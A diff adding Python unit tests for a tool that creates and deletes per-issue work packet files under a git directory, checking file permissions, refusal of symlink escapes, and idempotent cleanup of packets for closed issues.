+                out = lb.verb_materialize_packet(182, ctx, runner)
+            path = Path(out["packet_path"])
+            self.assertEqual(path, common / ".git" / "agentic-engineering" / "work-items" / "o--r--182.md")
+            self.assertEqual(path.stat().st_mode & 0o777, 0o600)
+            text = path.read_text(encoding="utf-8")
+            self.assertIn("## Canonical issue body", text)
+            self.assertIn("untrusted requirements data", text)
+            self.assertIn("Implement packets", text)
+            self.assertIn("#183: Child", text)
+            self.assertEqual(list((common / "worktree").iterdir()), [])
+            query = next(a for a in runner.calls[0] if a.startswith("query="))
+            self.assertNotIn("comments", query)
+
+    def test_materialize_terminal_issue_rejects_and_removes_stale_packet(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            common = Path(d)
+            (common / "worktree").mkdir()
+            ctx, runner, board = self._run(common, "done", "CLOSED")
+            target = common / ".git" / "agentic-engineering" / "work-items" / "o--r--182.md"
+            target.parent.mkdir(parents=True)
+            target.write_text("stale", encoding="utf-8")
+            with mock.patch.object(lb, "read_board_config", return_value=board), \
+                    mock.patch.object(lb, "git_common_dir", return_value=common / ".git"):
+                with self.assertRaises(lb.BoardError) as caught:
+                    lb.verb_materialize_packet(182, ctx, runner)
+            self.assertEqual(caught.exception.code, "packet_materialize_terminal")
+            self.assertFalse(target.exists())
+
+    def test_delete_refuses_non_terminal_issue(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            common = Path(d)
+            (common / "worktree").mkdir()
+            ctx, runner, board = self._run(common, "in_review", "OPEN")
+            target = common / ".git" / "agentic-engineering" / "work-items" / "o--r--182.md"
+            target.parent.mkdir(parents=True)
+            target.write_text("keep", encoding="utf-8")
+            with mock.patch.object(lb, "read_board_config", return_value=board), \
+                    mock.patch.object(lb, "git_common_dir", return_value=common / ".git"):
+                with self.assertRaises(lb.BoardError) as caught:
+                    lb.verb_delete_packet(182, ctx, runner)
+            self.assertEqual(caught.exception.code, "packet_delete_not_terminal")
+            self.assertTrue(target.exists())
+
+    def test_delete_unlinks_only_exact_issue_path(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            common = Path(d)
+            (common / "worktree").mkdir()
+            ctx, runner, board = self._run(common, "done", "CLOSED")
+            directory = common / ".git" / "agentic-engineering" / "work-items"
+            directory.mkdir(parents=True)
+            target = directory / "o--r--182.md"
+            neighbor = directory / "o--r--183.md"
+            neighbor.write_text("neighbor", encoding="utf-8")
+            target.symlink_to(neighbor)
+            with mock.patch.object(lb, "read_board_config", return_value=board), \
+                    mock.patch.object(lb, "git_common_dir", return_value=common / ".git"):
+                out = lb.verb_delete_packet(182, ctx, runner)
+            self.assertTrue(out["deleted"])
+            self.assertFalse(target.exists())
+            self.assertEqual(neighbor.read_text(encoding="utf-8"), "neighbor")
+
+    def test_symlinked_packet_parent_is_rejected(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            common = Path(d)
+            (common / "worktree").mkdir()
+            (common / ".git").mkdir()
+            escape = common / "escape"
+            escape.mkdir()
+            (common / ".git" / "agentic-engineering").symlink_to(escape, target_is_directory=True)
+            ctx, runner, board = self._run(common)
+            with mock.patch.object(lb, "read_board_config", return_value=board), \
+                    mock.patch.object(lb, "git_common_dir", return_value=common / ".git"):
+                with self.assertRaises(lb.BoardError) as caught:
+                    lb.verb_materialize_packet(182, ctx, runner)
+            self.assertEqual(caught.exception.code, "packet_path_unsafe")
+            self.assertEqual(list(escape.iterdir()), [])
+
+    def test_targeted_reconcile_cleans_abandoned_packet_idempotently(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            common = Path(d)
+            (common / "worktree").mkdir()
+            ctx = _ctx(str(common / "worktree"))
+            payload = json.loads(self._payload("abandoned", "CLOSED"))
+            payload["data"]["repository"]["issue"]["subIssues"]["nodes"] = []
+            runner = FakeRunner([(["api", "graphql"], _ok(json.dumps(payload)))])
+            board = lb.BoardConfig(owner="o", number=1, source="committed")
+            directory = common / ".git" / "agentic-engineering" / "work-items"
+            directory.mkdir(parents=True)
+            target = directory / "o--r--182.md"
+            neighbor = directory / "o--r--183.md"
+            target.write_text("packet", encoding="utf-8")
+            neighbor.write_text("neighbor", encoding="utf-8")
+            with mock.patch.object(lb, "read_board_config", return_value=board), \
+                    mock.patch.object(lb, "git_common_dir", return_value=common / ".git"):
+                first = lb.verb_reconcile(ctx, runner, issue=182, force=True)
+                runner2 = FakeRunner([(["api", "graphql"], _ok(json.dumps(payload)))])
+                second = lb.verb_reconcile(ctx, runner2, issue=182, force=True)
+            self.assertEqual(first["packet_cleanup"][0]["deleted"], True)
+            self.assertEqual(second["packet_cleanup"][0]["deleted"], False)
+            self.assertFalse(target.exists())
+            self.assertEqual(neighbor.read_text(encoding="utf-8"), "neighbor")
 
 
 if __name__ == "__main__":
